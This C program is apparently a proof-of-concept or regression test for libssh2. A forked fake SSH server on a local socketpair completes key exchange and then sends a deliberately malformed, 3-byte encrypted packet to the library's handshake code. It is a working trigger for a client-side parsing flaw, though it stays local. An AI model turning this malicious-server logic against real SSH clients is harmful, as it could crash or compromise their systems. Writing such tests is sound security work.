#include <arpa/inet.h>
#include <errno.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <stdint.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#include "libssh2.h"

struct buffer {
    unsigned char data[16384];
    size_t len;
};

static void fail(const char *where)
{
    perror(where);
    exit(2);
}

static void put_data(struct buffer *b, const void *p, size_t n)
{
    if(b->len + n > sizeof(b->data))
        fail("buffer overflow");
    memcpy(b->data + b->len, p, n);
    b->len += n;
}

static void put_u32(struct buffer *b, uint32_t n)
{
    unsigned char out[4] = {
        (unsigned char)(n >> 24), (unsigned char)(n >> 16),
        (unsigned char)(n >> 8), (unsigned char)n
    };
    put_data(b, out, 4);
}

static void put_string(struct buffer *b, const void *p, size_t n)
{
    put_u32(b, (uint32_t)n);
    put_data(b, p, n);
}

static void put_name(struct buffer *b, const char *s)
{
    put_string(b, s, strlen(s));
}

static uint32_t get_u32(const unsigned char *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | p[3];
}

static void read_all(int fd, void *out, size_t n)
{
    unsigned char *p = out;
    while(n) {
        ssize_t r = read(fd, p, n);
        if(r <= 0)
            fail("read");
        p += r;
        n -= (size_t)r;
    }
}

static void write_all(int fd, const void *in, size_t n)
{
    const unsigned char *p = in;
    while(n) {
        ssize_t w = write(fd, p, n);
        if(w <= 0)
            fail("write");
        p += w;
        n -= (size_t)w;
    }
}

static void read_line(int fd, struct buffer *line)
{
    unsigned char c;
    while(line->len < sizeof(line->data)) {
        read_all(fd, &c, 1);
        if(c == '\n') {
            if(line->len && line->data[line->len - 1] == '\r')
                line->len--;
            return;
        }
        put_data(line, &c, 1);
    }
    fail("banner length");
}

static void read_packet(int fd, struct buffer *payload)
{
    unsigned char header[5];
    unsigned char packet[16384];
    uint32_t len;
    size_t body_len;
    read_all(fd, header, sizeof(header));
    len = get_u32(header);
    if(len < 5 || len > sizeof(packet) || header[4] > len - 1)
        fail("packet length");
    body_len = len - 1;
    read_all(fd, packet, body_len);
    payload->len = 0;
    put_data(payload, packet, body_len - header[4]);
}

static void send_packet(int fd, const struct buffer *payload)
{
    unsigned char header[5];
    unsigned char padding[16] = {0};
    size_t pad = (8 - ((5 + payload->len) % 8)) % 8;
    uint32_t len;
    if(pad < 4)
        pad += 8;
    len = (uint32_t)(1 + payload->len + pad);
    header[0] = (unsigned char)(len >> 24);
    header[1] = (unsigned char)(len >> 16);
    header[2] = (unsigned char)(len >> 8);
    header[3] = (unsigned char)len;
    header[4] = (unsigned char)pad;
    write_all(fd, header, sizeof(header));
    write_all(fd, payload->data, payload->len);
    write_all(fd, padding, pad);
}

static EVP_PKEY *generate_key(int type)
{
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(type, NULL);
    EVP_PKEY *key = NULL;
    if(!ctx || EVP_PKEY_keygen_init(ctx) <= 0 ||
       EVP_PKEY_keygen(ctx, &key) <= 0)
        fail("keygen");
    EVP_PKEY_CTX_free(ctx);
    return key;
}

static void sha256_buffer(const struct buffer *input, unsigned char out[32])
{
    unsigned int n = 0;
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    if(!ctx || EVP_DigestInit_ex(ctx, EVP_sha256(), NULL) <= 0 ||
       EVP_DigestUpdate(ctx, input->data, input->len) <= 0 ||
       EVP_DigestFinal_ex(ctx, out, &n) <= 0 || n != 32)
        fail("sha256");
    EVP_MD_CTX_free(ctx);
}

static void chacha20_crypt(const unsigned char key[32], uint64_t seq,
                           uint64_t counter, const unsigned char *in,
                           unsigned char *out, size_t n)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[16] = {0};
    int outlen = 0;
    int final = 0;
    size_t i;
    for(i = 0; i < 8; i++) {
        iv[i] = (unsigned char)(counter >> (i * 8));
        iv[8 + i] = (unsigned char)(seq >> ((7 - i) * 8));
    }
    if(!ctx || EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key, iv) <= 0 ||
       EVP_EncryptUpdate(ctx, out, &outlen, in, (int)n) <= 0 ||
       EVP_EncryptFinal_ex(ctx, out + outlen, &final) <= 0 ||
       (size_t)(outlen + final) != n)
        fail("chacha20");
    EVP_CIPHER_CTX_free(ctx);
}

static void poly1305_tag(const unsigned char key[32],
                         const unsigned char *data, size_t len,
                         unsigned char tag[16])
{
    EVP_MAC *mac = EVP_MAC_fetch(NULL, "POLY1305", NULL);
    EVP_MAC_CTX *ctx = mac ? EVP_MAC_CTX_new(mac) : NULL;
    size_t outlen = 0;
    if(!ctx || EVP_MAC_init(ctx, key, 32, NULL) <= 0 ||
       EVP_MAC_update(ctx, data, len) <= 0 ||
       EVP_MAC_final(ctx, tag, &outlen, 16) <= 0 || outlen != 16)
        fail("poly1305");
    EVP_MAC_CTX_free(ctx);
    EVP_MAC_free(mac);
}

static void server(int fd)
{
    static const char server_banner[] = "SSH-2.0-libssh2-poc";
    struct buffer client_banner = {{0}, 0};
    struct buffer client_kex = {{0}, 0};
    struct buffer server_kex = {{0}, 0};
    struct buffer packet = {{0}, 0};
    struct buffer hostkey = {{0}, 0};
    struct buffer exchange = {{0}, 0};
    struct buffer secret_mpint = {{0}, 0};
    struct buffer sigblob = {{0}, 0};
    struct buffer reply = {{0}, 0};
    unsigned char xpub[32], epk[32], shared[32], hpk[32];
    unsigned char hash[32], key[64], sig[64];
    unsigned char zeros[32] = {0}, poly_key[32], wire[23];
    unsigned char body[3] = {0, 6, 0};
    unsigned char size[4] = {0, 0, 0, 3};
    EVP_PKEY *xkey, *hkey, *peer;
    EVP_PKEY_CTX *derive;
    EVP_MD_CTX *sign;
    size_t n, i, siglen;
    int first;

    write_all(fd, server_banner, strlen(server_banner));
    write_all(fd, "\r\n", 2);
    read_line(fd, &client_banner);
    read_packet(fd, &client_kex);
    if(client_kex.len == 0 || client_kex.data[0] != 20)
        fail("client KEXINIT");

    server_kex.data[server_kex.len++] = 20;
    put_data(&server_kex, zeros, 16);
    put_name(&server_kex, "curve25519-sha256");
    put_name(&server_kex, "ssh-ed25519");
    put_name(&server_kex, "chacha20-poly1305@openssh.com");
    put_name(&server_kex, "chacha20-poly1305@openssh.com");
    put_name(&server_kex, "hmac-sha2-256");
    put_name(&server_kex, "hmac-sha2-256");
    put_name(&server_kex, "none");
    put_name(&server_kex, "none");
    put_name(&server_kex, "");
    put_name(&server_kex, "");
    put_data(&server_kex, zeros, 5);
    send_packet(fd, &server_kex);

    read_packet(fd, &packet);
    if(packet.len != 37 || packet.data[0] != 30 ||
       get_u32(packet.data + 1) != 32)
        fail("client ECDH INIT");
    memcpy(xpub, packet.data + 5, 32);

    xkey = generate_key(EVP_PKEY_X25519);
    hkey = generate_key(EVP_PKEY_ED25519);
    n = sizeof(epk);
    if(EVP_PKEY_get_raw_public_key(xkey, epk, &n) <= 0 || n != 32)
        fail("X25519 public key");
    n = sizeof(hpk);
    if(EVP_PKEY_get_raw_public_key(hkey, hpk, &n) <= 0 || n != 32)
        fail("Ed25519 public key");
    peer = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, NULL, xpub, 32);
    derive = EVP_PKEY_CTX_new(xkey, NULL);
    n = sizeof(shared);
    if(!peer || !derive || EVP_PKEY_derive_init(derive) <= 0 ||
       EVP_PKEY_derive_set_peer(derive, peer) <= 0 ||
       EVP_PKEY_derive(derive, shared, &n) <= 0 || n != 32)
        fail("X25519 derive");

    put_name(&hostkey, "ssh-ed25519");
    put_string(&hostkey, hpk, 32);
    first = 0;
    while(first < 31 && shared[first] == 0)
        first++;
    if(shared[first] & 0x80)
        put_data(&secret_mpint, zeros, 1);
    put_data(&secret_mpint, shared + first, 32 - (size_t)first);

    put_string(&exchange, client_banner.data, client_banner.len);
    put_string(&exchange, server_banner, strlen(server_banner));
    put_string(&exchange, client_kex.data, client_kex.len);
    put_string(&exchange, server_kex.data, server_kex.len);
    put_string(&exchange, hostkey.data, hostkey.len);
    put_string(&exchange, xpub, 32);
    put_string(&exchange, epk, 32);
    put_string(&exchange, secret_mpint.data, secret_mpint.len);
    sha256_buffer(&exchange, hash);

    sign = EVP_MD_CTX_new();
    siglen = sizeof(sig);
    if(!sign || EVP_DigestSignInit(sign, NULL, NULL, NULL, hkey) <= 0 ||
       EVP_DigestSign(sign, sig, &siglen, hash, sizeof(hash)) <= 0 ||
       siglen != 64)
        fail("Ed25519 sign");
    put_name(&sigblob, "ssh-ed25519");
    put_string(&sigblob, sig, siglen);
    reply.data[reply.len++] = 31;
    put_string(&reply, hostkey.data, hostkey.len);
    put_string(&reply, epk, 32);
    put_string(&reply, sigblob.data, sigblob.len);
    send_packet(fd, &reply);

    read_packet(fd, &packet);
    if(packet.len != 1 || packet.data[0] != 21)
        fail("client NEWKEYS");
    packet.len = 0;
    packet.data[packet.len++] = 21;
    send_packet(fd, &packet);

    exchange.len = 0;
    put_string(&exchange, secret_mpint.data, secret_mpint.len);
    put_data(&exchange, hash, 32);
    put_data(&exchange, "D", 1);
    put_data(&exchange, hash, 32);
    sha256_buffer(&exchange, key);
    exchange.len = 0;
    put_string(&exchange, secret_mpint.data, secret_mpint.len);
    put_data(&exchange, hash, 32);
    put_data(&exchange, key, 32);
    sha256_buffer(&exchange, key + 32);

    chacha20_crypt(key + 32, 3, 0, size, wire, 4);
    chacha20_crypt(key, 3, 1, body, wire + 4, 3);
    chacha20_crypt(key, 3, 0, zeros, poly_key, 32);
    poly1305_tag(poly_key, wire, 7, wire + 7);
    write_all(fd, wire, sizeof(wire));
    shutdown(fd, SHUT_WR);

    EVP_MD_CTX_free(sign);
    EVP_PKEY_CTX_free(derive);
    EVP_PKEY_free(peer);
    EVP_PKEY_free(xkey);
    EVP_PKEY_free(hkey);
    for(i = 0; i < sizeof(key); i++)
        key[i] = 0;
}

int main(void)
{
    int fds[2], status, rc;
    pid_t child;
    LIBSSH2_SESSION *session;
    char *error = NULL;
    int error_len = 0;

    signal(SIGPIPE, SIG_IGN);
    if(socketpair(AF_UNIX, SOCK_STREAM, 0, fds) != 0)
        fail("socketpair");
    child = fork();
    if(child < 0)
        fail("fork");
    if(child == 0) {
        close(fds[0]);
        server(fds[1]);
        close(fds[1]);
        _exit(0);
    }
    close(fds[1]);
    if(libssh2_init(0) != 0)
        fail("libssh2_init");
    session = libssh2_session_init();
    if(!session)
        fail("libssh2_session_init");
    libssh2_session_set_timeout(session, 3000);
    rc = libssh2_session_handshake(session, fds[0]);
    libssh2_session_last_error(session, &error, &error_len, 0);
    fprintf(stderr, "handshake rc=%d error=%.*s\n", rc, error_len,
            error ? error : "");
    libssh2_session_free(session);
    libssh2_exit();
    close(fds[0]);
    if(waitpid(child, &status, 0) < 0 || !WIFEXITED(status) ||
       WEXITSTATUS(status) != 0)
        fail("server");
    return rc == 0 ? 1 : 0;
}
